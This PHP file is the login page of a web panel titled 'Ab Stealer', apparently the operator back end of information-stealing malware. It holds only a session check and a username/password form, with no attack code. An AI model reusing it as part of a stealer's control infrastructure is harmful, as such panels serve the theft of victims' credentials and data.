<?php 
session_start();
if (isset($_SESSION['login'])) {
    if ($_SESSION['login'] == '1') {
        header("location: Panel.php");
    }
}
?>
<html>
    <head>
        <title>Ab Stealer</title>
        <link type="text/css" rel="stylesheet" href="style.css" >
        <script src="https://use.fontawesome.com/ef7ebb85cf.js"></script>
    </head>
    <body>
        <section class="Main">
            <form method="post" action="login.php">
                <section class="username">
                    <h>Username :</h>
                    <input type="text" name="username" placeholder="..." />
                </section><br>
                <section class="password">
                    <h>Password :</h>
                    <input type="password" name="password" placeholder="..." />
                </section>
                <section class="submit">
                    <input type="submit" name="submit" value="Login"/>
                </section>
            </form>
        </section>
        <section class="about">
            <i class="fa fa-user" aria-hidden="true"></i> &nbspCreate By : <h>KingDomSc</h> , Skype : <h>KingDomSc</h> .
        </section>
    </body>
</html>